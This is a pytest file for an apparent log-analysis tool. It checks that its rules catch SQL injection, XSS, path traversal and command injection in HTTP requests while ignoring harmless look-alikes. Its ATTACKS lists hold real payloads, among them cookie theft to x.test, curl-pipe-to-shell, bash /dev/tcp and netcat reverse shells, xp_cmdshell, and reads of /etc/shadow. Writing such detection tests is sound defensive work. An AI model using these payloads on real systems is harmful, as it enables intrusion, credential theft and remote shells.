"""Tests for the default SQL injection, XSS, path traversal and command injection rules.

Every rule has attack requests it must catch (written by hand from common cheat sheets, not
copied from the sample data generator, so the benchmark later has something to prove) and
harmless requests that only look similar and must be left alone.
"""

import importlib.util
import json
import time
from collections import Counter
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import quote

import pytest

from loginsight.detection.models import Severity
from loginsight.detection.ruleset import load_rules
from loginsight.detection.signatures import detect_signatures, normalise
from loginsight.parsing.models import LogEntry
from loginsight.parsing.parser import parse_file, parse_line

ROOT = Path(__file__).resolve().parents[2]
WHEN = datetime(2025, 6, 1, 12, 0, tzinfo=timezone.utc)
RULES = {rule.id: rule for rule in load_rules().signatures}
CLASSES = {
    "sql_injection": ("sqli-", Severity.HIGH, 3),
    "xss": ("xss-", Severity.MEDIUM, 2),
    "path_traversal": ("traversal-", Severity.HIGH, 2),
    "command_injection": ("cmdi-", Severity.CRITICAL, 2),
}

# --- attacks: (rule id, request target) -----------------------------------------------

ATTACKS = {
    "sqli-union-select": [
        "/item?id=-1 UNION ALL SELECT NULL,NULL,version()--",
        "/item?id=1/**/UNION/**/SELECT/**/1,2",
        "/item?id=1 uNiOn aLl sElEcT 1,@@version",
        "/item?id=0'+union+select+user,pass+from+admin--+",
        "/item?id=1/**/UNION/**/ALL/**/SELECT/**/1",
    ],
    "sqli-tautology": [
        "/login?user=' or '1'='1",
        "/login?user=admin' or 1=1#",
        "/login?user=') or ('a'='a",
        '/login?user=" or ""="',
        "/login?user='or'1'='1",
        "/item?id=5 or 1=1",
        "/item?id=5 AND 7=7",
        "/login?u=x' and 1=2 union select 1",
        "/item?id=1' OR 'x' LIKE 'x",
        "/item?id=1'||'a'='a",
        "/item?id=1' or/**/1=1",
        "/item?id=5/**/or/**/7=7",
        "/item?id=1'/**/and/**/'a'='a",
        "/item?id=1 having 1=1",
    ],
    "sqli-quote-comment": [
        "/login?user=admin'-- -",
        "/login?user=admin'#",
        "/login?user=admin')/*",
        '/login?user=admin" --',
    ],
    "sqli-time-delay": [
        "/item?id=1;SELECT SLEEP(10)",
        "/item?id=1' AND pg_sleep(5)--",
        "/item?id=1;WAITFOR DELAY '0:0:5'--",
        "/item?id=1 AND BENCHMARK(5000000,MD5(1))",
        "/item?id=1 and 1=dbms_pipe.receive_message('a',5)",
    ],
    "sqli-information-schema": [
        "/item?id=1 union select table_name from information_schema.tables",
        "/item?id=1 and (select count(*) from sqlite_master)>0",
        "/item?id=1 union select load_file('/etc/hostname')",
        "/item?id=1 and 1=(select count(*) from sysobjects)",
        "/item?id=1 and (select count(*) from mysql.user)>0",
        "/item?id=1 and exists(select 1 from sys.tables)",
        "/item?id=1 into outfile '/var/www/html/x.php'",
        "/item?id=1 into dumpfile '/tmp/x'",
    ],
    "sqli-stacked-statement": [
        "/item?id=1; DROP TABLE users--",
        "/item?id=1;DELETE FROM sessions",
        "/item?id=1'; EXEC xp_cmdshell 'dir'--",
        "/item?id=1;UPDATE users SET admin=1",
        "/item?id=1 and 1=xp_cmdshell('whoami')",
    ],
    "xss-script-tag": [
        "/s?q=<script>document.location='http://x.test/?c='+document.cookie</script>",
        "/s?q=<ScRiPt>prompt(1)</ScRiPt>",
        "/s?q=<script src=//x.test/a.js>",
        "/s?q=</script><script>alert(1)",
    ],
    "xss-event-handler-in-tag": [
        "/s?q=<body onload=alert(1)>",
        "/s?q=<svg/onload=confirm(1)>",
        "/s?q=<input autofocus onfocus=alert(1)>",
        "/s?q=<details open ontoggle=alert(1)>",
        "/s?q=<img src=x onerror=alert(1)>",
        "/s?q=<video><source onerror=alert(1)>",
    ],
    "xss-event-handler-after-quote": [
        '/s?q=x" onmouseover="alert(1)',
        "/s?q=x'onerror='alert(1)",
        '/s?q=x"/onfocus=alert(1)//',
        "/s?q=x'+onmouseover=alert(1)+'",
    ],
    "xss-script-uri": [
        "/go?next=javascript:alert(document.domain)",
        "/go?next=JaVaScRiPt:%0aalert(1)",
        "/go?next=data:text/html,<b>x</b>",
        "/go?next=vbscript:msgbox(1)",
    ],
    "xss-embedding-tag": [
        "/s?q=<iframe src=//x.test>",
        "/s?q=<object data=x.swf>",
        "/s?q=<meta http-equiv=refresh content=0;url=//x.test>",
        "/s?q=<embed src=x>",
        "/s?q=<base href=//x.test/>",
    ],
    "traversal-dotdot": [
        "/get?f=../../../../windows/system.ini",
        "/get?f=..%2f..%2f..%2fapp/config",
        "/get?f=%2e%2e%5c%2e%2e%5csecret.txt",
        "/get?f=%252e%252e%252f%252e%252e%252fx",
        "/static/..;/admin",
        "/get?f=....//....//x",
        "/static/css/..",
        "/get?f=..%00/..%00/x",
    ],
    "traversal-sensitive-file": [
        "/get?f=/etc/passwd",
        "/get?f=/proc/self/environ",
        "/get?f=C:\\Windows\\System32\\drivers\\etc\\hosts",
        "/get?f=/var/log/auth.log",
        "/get?f=%2Fetc%2Fshadow",
        "/get?f=..\\..\\boot.ini",
        "/get?f=windows/system32/notepad.exe",
        "/get?f=c:/winnt/system32/config/sam",
        "/get?f=c:\\windows\\system32\\cmd.exe",
    ],
    "traversal-file-wrapper": [
        "/get?page=php://filter/convert.base64-encode/resource=index",
        "/get?page=expect://id",
        "/get?page=file:///etc/hostname",
        "/get?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4=",
        "/get?page=phar://upload/a.jpg/x",
    ],
    "cmdi-separator-command": [
        "/run?host=8.8.8.8;uname -a",
        "/run?host=8.8.8.8|nc 1.2.3.4 99",
        "/run?host=8.8.8.8&&cat /etc/hostname",
        "/run?host=8.8.8.8||whoami",
        "/run?host=$(id)",
        "/run?host=`hostname`",
        "/run?host=x;curl http://x.test/s.sh|sh",
        "/run?host=x%0a%3Bwhoami",
        "/run?host=x;ping -c 1 10.0.0.1",
    ],
    "cmdi-shell-path": [
        "/run?c=/bin/bash -c ls",
        "/run?c=cmd.exe /c dir",
        "/run?c=powershell -nop -c whoami",
        "/run?c=/usr/bin/env python",
        "/run?c=/bin/sh",
    ],
    "cmdi-reverse-shell": [
        "/run?c=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "/run?c=nc -lvp 4444 -e /bin/sh",
        "/run?c=cat${IFS}/etc/hostname",
        "/run?c=mkfifo /tmp/f",
        "/run?c=socat tcp:10.0.0.1:99 exec:sh",
        "/run?c=exec 3<>/dev/tcp/10.0.0.1/80",
        "/run?c=bash -i",
    ],
}

# Attacks written in a way the rules cannot see. They are pinned as expected failures, so if a
# later change fixes one, the test fails and the entry moves to ATTACKS.
KNOWN_GAPS = [
    ("sqli-union-select", "/i?id=1 uni/**/on select 1"),
    ("traversal-dotdot", "/g?f=..%c0%af..%c0%afetc/passwd"),
    ("xss-script-tag", "/s?q=%u003cscript%u003e"),
    ("sqli-tautology", "/i?id=1 or true"),
]

# --- harmless requests: no rule may fire ----------------------------------------------

HARMLESS = [
    # the look-alikes the issue asks for
    "/search?q=select+shoes",
    "/search?q=drop+shipping+rates",
    "/search?q=union+jack+flag",
    "/download?file=report.pdf",
    "/download?file=annual-report-2025.pdf",
    "/blog/how-to-use-script-tags-in-email",
    "/docs/etc-hosts-explained",
    "/products?sort=price&order=desc",
    "/search?q=cat+food",
    "/help?topic=password-reset",
    "/v1;x",
    "/search?q=o'brien",
    # quotes and apostrophes in ordinary text
    "/search?q=rock'n'roll",
    "/search?q=it's+a+trap",
    "/search?q=men's+shoes",
    "/search?q=kids'+toys",
    "/search?q=don't+stop",
    '/search?q="red"+or+"blue"',
    "/search?q=what's+new+--+week+3",
    # query strings with several parameters and path parameters
    "/products/12?ref=home&utm_source=a&utm_medium=b",
    "/page;jsessionid=ABC123",
    "/docs/api/v2/users;type=json",
    "/a?x=1&&y=2",
    "/p?utm=a&&b=c",
    "/a?x=1;y=2",
    "/p?x=1;2;3",
    "/a?x=1&id=5",
    "/a?x=1&&id=5",
    "/a;id=5",
    "/p?x=1&or=2",
    "/p?and=1&or=2",
    "/a?tags=red|blue|green",
    "/api?ids=1,2,3&fields=a|b",
    "/profile?online=1&onload=yes",
    "/page?onclick=1",
    "/api?x=1&onerror=0",
    # words that are also commands, keywords and handlers
    "/search?q=how+to+kill+a+process+in+linux",
    "/search?q=id+card",
    "/search?q=sh+script",
    "/search?q=ls+command",
    "/search?q=etc+hosts",
    "/search?q=sleep+well",
    "/search?q=sleep+8+hours",
    "/search?q=benchmark+results",
    "/search?q=information+schema+design",
    "/search?q=cmd+line+tools",
    "/search?q=dev+tcp",
    "/search?q=nc+cable",
    "/search?q=bash+scripting+tutorial",
    "/search?q=php+tutorial",
    "/search?q=data+science",
    "/search?q=file+upload+guide",
    "/search?q=zip+code",
    "/search?q=select+your+size",
    "/search?q=union+of+soviet+republics",
    "/search?q=drop+down+menu",
    "/search?q=drop+table+tennis",
    "/search?q=black+and+white",
    "/search?q=salt+and+pepper",
    "/search?q=online+shop",
    "/blog/sql-injection-explained",
    "/blog/using-env-files",
    "/docs/select-statement",
    # paths, dots and punctuation
    "/files/report-2025.pdf",
    "/img/photo.jpg?w=100&h=100",
    "/api/items?page=2&limit=20",
    "/news/2025/10/27/market-update",
    "/path/with.dots/file.name.ext",
    "/a..b/c",
    "/v1.2..3/x",
    "/download?file=my..report.pdf",
    "/search?q=wait...",
    "/search?q=loading...",
    "/bin/shop",
    "/products/bin/shoes",
    "/p?path=/home/user/docs",
    "/p?file=/var/www/html/index.html",
    "/p?next=/account/orders",
    "/p?ref=https://example.test/a?b=c",
    # markup and operators that are not attacks
    "/search?q=%3Cb%3Ebold%3C/b%3E",
    "/p?html=%3Cp%3Ehello%3C/p%3E",
    "/search?q=a<b",
    "/search?q=5>3",
    "/p?q=a%3Cb%26%26c%3Ed",
    "/calc?expr=2*3=6",
    "/search?q=a=b",
    "/search?q=1+or+2",
    "/search?q=javascript:+the+good+parts",
    "/p?q=C%2B%2B+tutorial",
    "/p?q=100%25+cotton",
    "/p?q=%E4%BD%A0%E5%A5%BD",
    # query languages and JSON in the URL
    '/api?filter={"or":[{"a":1}],"and":[{"b":2}]}',
    "/api?$filter=Name eq 'Bob' and Age gt 30",
    "/api?q=name='Bob'",
    "/api?sort=-created,+name",
    "/cal?d=2025-10-27&t=10:30",
    "/cart?item=cat&item=dog",
    # plain pages
    "/",
    "/home",
    "/login",
    "/api/users/42",
    "/static/app.css",
    "/favicon.ico",
    "/robots.txt",
    "/img/a.jpg",
]

# Each rule also has its own near misses: requests that share its words but are not attacks.
NEAR_MISSES = {
    "sqli-union-select": ["/s?q=union+of+committee", "/s?q=onion+select", "/s?q=union.select"],
    "sqli-tautology": ["/s?q=o'brien", "/s?q=rock'n'roll", "/s?q=1+or+2", '/api?filter={"or":[1]}'],
    "sqli-quote-comment": ["/s?q=it's+fine", "/s?q=5+--+3", "/s?q=a%23b"],
    "sqli-time-delay": ["/s?q=sleep+well", "/s?q=sleep+8+hours", "/s?q=benchmark+results"],
    "sqli-information-schema": [
        "/s?q=information+schema+design",
        "/s?q=schema.org",
        "/s?q=load+file",
    ],
    "sqli-stacked-statement": ["/s?q=drop+table+tennis", "/s?q=a;b", "/v1;x"],
    "xss-script-tag": ["/blog/how-to-use-script-tags-in-email", "/s?q=a<b", "/s?q=scripture"],
    "xss-event-handler-in-tag": ["/s?q=<b>bold</b>", "/p?onload=1", "/s?q=<a href=x>link</a>"],
    "xss-event-handler-after-quote": ["/p?onclick=1", "/s?q=it's+online", "/api?x=1&onerror=0"],
    "xss-script-uri": [
        "/s?q=javascript:+the+good+parts",
        "/s?q=javascript+tutorial",
        "/s?q=data+science",
    ],
    "xss-embedding-tag": ["/s?q=<b>iframe</b>", "/s?q=iframe+tutorial", "/s?q=meta+tags+guide"],
    "traversal-dotdot": ["/a..b/c", "/download?file=my..report.pdf", "/s?q=wait..."],
    "traversal-sensitive-file": ["/docs/etc-hosts-explained", "/s?q=etc+hosts", "/darwin.ini"],
    "traversal-file-wrapper": ["/s?q=file+upload", "/s?q=zip+code", "/s?q=data+science"],
    "cmdi-separator-command": ["/a?x=1&id=5", "/a;id=5", "/a?tags=red|blue|green", "/s?q=cat+food"],
    "cmdi-shell-path": ["/bin/shop", "/products/bin/shoes", "/s?q=cmd+line"],
    "cmdi-reverse-shell": ["/s?q=dev+tcp", "/s?q=nc+cable", "/s?q=bash+scripting"],
}


def matches(rule_id, target):
    return bool(RULES[rule_id].compiled.search(normalise(target)))


def fired(target):
    text = normalise(target)
    return sorted(rule_id for rule_id, rule in RULES.items() if rule.compiled.search(text))


def variants(payload):
    """The payload as written, in other case, and URL-encoded once and twice where that is safe."""
    found = {"as written": payload, "swapped case": payload.swapcase()}
    if "%" not in payload:
        found["encoded"] = quote(payload, safe="")
        found["encoded twice"] = quote(quote(payload, safe=""), safe="")
    elif "%25" not in payload:
        found["encoded"] = quote(payload, safe="")
    return found


CASES = [(rule_id, payload) for rule_id, payloads in ATTACKS.items() for payload in payloads]
VARIANT_CASES = [
    pytest.param(rule_id, name, text, id=f"{rule_id}|{name}|{payload[:40]}")
    for rule_id, payload in CASES
    for name, text in variants(payload).items()
]


# --- the rule set itself --------------------------------------------------------------


def test_every_rule_in_the_default_file_has_attack_and_harmless_examples():
    assert set(ATTACKS) == set(RULES) - {r for r in RULES if r.startswith("probe-")}
    assert set(NEAR_MISSES) == set(ATTACKS)
    for rule_id in ATTACKS:
        assert len(ATTACKS[rule_id]) >= 3, rule_id
        assert len(NEAR_MISSES[rule_id]) >= 3, rule_id


@pytest.mark.parametrize(("label", "expected"), list(CLASSES.items()))
def test_each_class_has_enough_rules_with_the_agreed_severity(label, expected):
    prefix, severity, minimum = expected
    rules = [rule for rule in RULES.values() if rule.id.startswith(prefix)]
    assert len(rules) >= minimum
    assert all(rule.label == label for rule in rules)
    assert all(rule.severity is severity for rule in rules)


def test_rule_ids_are_unique_and_descriptions_say_something():
    ids = [rule.id for rule in load_rules().signatures]
    assert len(ids) == len(set(ids))
    assert all(len(rule.description) > 20 for rule in RULES.values())


def test_the_attack_examples_are_not_copied_from_the_sample_data_generator():
    spec = importlib.util.spec_from_file_location(
        "generate_logs", ROOT / "scripts" / "generate_logs.py"
    )
    generator = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(generator)
    used = {
        *generator._SQL_PAYLOADS,
        *generator._XSS_PAYLOADS,
        *generator._TRAVERSAL_PAYLOADS,
        *generator._COMMAND_PAYLOADS,
    }
    mine = {payload for _, payload in CASES}
    assert mine.isdisjoint(used)


# --- attacks are caught ---------------------------------------------------------------


@pytest.mark.parametrize(("rule_id", "name", "target"), VARIANT_CASES)
def test_each_attack_is_caught_by_its_rule_however_it_is_written(rule_id, name, target):
    assert matches(rule_id, target), (name, normalise(target))


def entry_for(target):
    path, _, query = target.partition("?")
    return LogEntry(
        ip="203.0.113.7",
        time=WHEN,
        method="GET",
        path=path,
        query=query,
        protocol="HTTP/1.1",
        status=200,
        size=0,
        request=f"GET {target} HTTP/1.1",
    )


@pytest.mark.parametrize(("rule_id", "payload"), CASES)
def test_the_rule_fires_through_the_whole_engine_too(rule_id, payload):
    found = detect_signatures([entry_for("/ok"), entry_for(payload)], load_rules())
    ours = [d for d in found if d.rule_id == rule_id]
    assert len(ours) == 1
    assert ours[0].first_index == 1
    assert ours[0].label == RULES[rule_id].label
    assert ours[0].severity is RULES[rule_id].severity
    assert ours[0].evidence.startswith("GET /")


# --- harmless requests are left alone -------------------------------------------------


@pytest.mark.parametrize("target", HARMLESS)
def test_a_harmless_request_fires_no_rule(target):
    assert fired(target) == []


@pytest.mark.parametrize(
    ("rule_id", "target"), [(r, t) for r, ts in NEAR_MISSES.items() for t in ts]
)
def test_each_rules_near_misses_do_not_fire_that_rule(rule_id, target):
    assert not matches(rule_id, target)


@pytest.mark.parametrize("target", HARMLESS[:30])
def test_harmless_requests_stay_quiet_when_url_encoded_too(target):
    assert fired(quote(target, safe="")) == []


def test_there_are_plenty_of_harmless_examples():
    assert len(HARMLESS) >= 90


# --- known gaps -----------------------------------------------------------------------


@pytest.mark.parametrize(("rule_id", "target"), KNOWN_GAPS)
@pytest.mark.xfail(strict=True, reason="known gap: needs decoding or parsing beyond the spec")
def test_known_gap_is_not_caught_yet(rule_id, target):
    assert matches(rule_id, target)


# --- the labelled sample logs ---------------------------------------------------------


def labelled(path):
    return {
        json.loads(row)["line"] - 1: json.loads(row)["label"]
        for row in path.read_text().splitlines()
    }


def test_the_clean_sample_log_raises_nothing():
    entries = parse_file(ROOT / "data" / "samples" / "clean.log").entries
    assert detect_signatures(entries, load_rules()) == []


def test_the_demo_log_flags_no_unlabelled_line():
    entries = parse_file(ROOT / "data" / "samples" / "demo.log").entries
    labels = labelled(ROOT / "data" / "samples" / "demo.labels.jsonl")
    found = detect_signatures(entries, load_rules())
    assert found, "the demo log has attacks, so something must be found"
    assert [d.first_index for d in found if d.first_index not in labels] == []


def test_the_demo_log_finds_every_labelled_line_of_these_four_classes_as_its_own_class():
    entries = parse_file(ROOT / "data" / "samples" / "demo.log").entries
    labels = labelled(ROOT / "data" / "samples" / "demo.labels.jsonl")
    by_line = {}
    for detection in detect_signatures(entries, load_rules()):
        by_line.setdefault(detection.first_index, set()).add(detection.label)
    wanted = {line: label for line, label in labels.items() if label in CLASSES}
    assert len(wanted) >= 20
    assert {
        line: label for line, label in wanted.items() if label not in by_line.get(line, ())
    } == {}


@pytest.fixture(scope="module")
def generator():
    spec = importlib.util.spec_from_file_location(
        "generate_logs", ROOT / "scripts" / "generate_logs.py"
    )
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.mark.parametrize("seed", [1, 2, 3, 4, 5])
def test_generated_attack_logs_are_found_class_by_class_with_no_false_alarm(generator, seed):
    lines, labels = generator.generate(seed=seed, lines=3000, attack_ratio=0.1)
    entries = [parse_line(line) for line in lines]
    truth = {item["line"] - 1: item["label"] for item in labels}
    detected = {}
    for detection in detect_signatures(entries, load_rules()):
        detected.setdefault(detection.first_index, set()).add(detection.label)
    missed = [
        (line, label)
        for line, label in truth.items()
        if label in CLASSES and label not in detected.get(line, ())
    ]
    false_alarms = [line for line in detected if line not in truth]
    assert missed == []
    assert false_alarms == []
    assert Counter(truth.values())["sql_injection"] > 0


@pytest.mark.parametrize("seed", range(10))
def test_generated_clean_logs_raise_nothing(generator, seed):
    lines, _ = generator.generate(seed=seed, lines=2000, attack_ratio=0)
    entries = [parse_line(line) for line in lines]
    assert detect_signatures(entries, load_rules()) == []


# --- hostile input --------------------------------------------------------------------

HOSTILE = [
    "'" + " '" * 1000,
    "'" + "/**/" * 500,
    "'" + ")" * 2000,
    "' or " * 400,
    "union" + "/**/" * 500,
    "union " * 340,
    "<a " * 680,
    "<a " + "x" * 2040,
    ".." * 1000,
    "../" * 680,
    "..;" * 680,
    ";" * 2000,
    "|" * 2000,
    "`" * 2000,
    "$(" * 1000,
    "&&" * 1000,
    "/" * 2000,
    "/etc/" * 400,
    "/proc/self/" * 180,
    "nc " + "-a " * 680,
    "bash " * 400,
    "cmd " * 500,
    "%" * 2000,
    "'<;|`$(../" * 220,
]


@pytest.mark.parametrize("text", HOSTILE, ids=[f"hostile-{n}" for n in range(len(HOSTILE))])
def test_hostile_input_is_matched_against_every_rule_quickly(text):
    started = time.perf_counter()
    fired("/p?" + text)
    assert time.perf_counter() - started < 0.25


def test_all_the_hostile_inputs_together_stay_well_under_a_second():
    started = time.perf_counter()
    for text in HOSTILE:
        fired("/p?" + text)
    assert time.perf_counter() - started < 1.0
